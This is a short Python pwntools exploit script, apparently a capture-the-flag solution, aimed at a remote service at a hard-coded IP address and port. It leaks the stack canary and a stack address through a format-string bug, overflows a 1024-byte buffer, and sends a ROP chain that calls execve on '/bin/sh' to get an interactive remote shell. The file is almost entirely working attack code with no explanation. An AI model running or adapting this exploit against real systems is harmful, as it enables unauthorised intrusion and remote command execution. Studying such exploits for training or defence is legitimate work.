from pwn import *
syscall = 0x265ec + 0x8048000
mainaddr = 0x8048941


popeax = 0x4d04d + 0x8048000
popedx = 0x28d6b + 0x8048000
popebx = 0x1d1 + 0x8048000
popecxpopebx = 0x28d91 + 0x8048000

cur = -0x440

print hex(cur)
r = remote("34.246.67.107", 31337)

r.recvuntil("e? ")
inp = "%%%d$p||%%%d$p"%(251,258)

print "Sending %s"%inp
r.sendline(inp)

r.recvuntil("Hello ")

data = r.recvuntil("What")[:-5].split("||")

cookie = int(data[0],16)
stackLeak = int(data[1],16)

print "stackLeak -> 0x%x"%stackLeak

r.clean()

r.sendline("A"*1024+p32(cookie)+p32(0x0)*3+p32(0x8048941))

r.recvuntil("name? ")

r.sendline("/bin/sh\x00")

print r.recvuntil("today?")

ropchain = [popecxpopebx, 0x0, stackLeak+cur-12, popedx, 0x0, popeax, 0xb, syscall]
payload = "A"*1024 + p32(cookie) + "BBBB"*3
for i in ropchain:
	payload += p32(i)
r.sendline(payload)
r.interactive()
